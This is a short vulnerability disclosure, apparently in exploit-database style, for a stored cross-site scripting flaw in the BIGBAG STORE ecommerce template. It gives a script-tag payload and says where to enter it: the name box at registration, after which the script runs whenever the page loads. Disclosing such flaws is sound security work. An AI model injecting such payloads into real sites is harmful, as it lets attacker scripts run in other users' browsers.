@@ -1,0 +1,11 @@
+BIGBAG STORE - Ecommerce Template Cross Site Scripting
+Author: William Laurent
+Price Themes: 9$
+Vendor Homepage: http://themes.iamabdus.com/bigbag/
+
+Payload: <script>prompt("Pentest by William Laurent");</script>
+
+Register, input name box with *payload*. So an alert will show after you register
+and refresh the page too.
+
+Thanks to: L4663r666h05t - Indonesian Code Party - Exploiter.ID
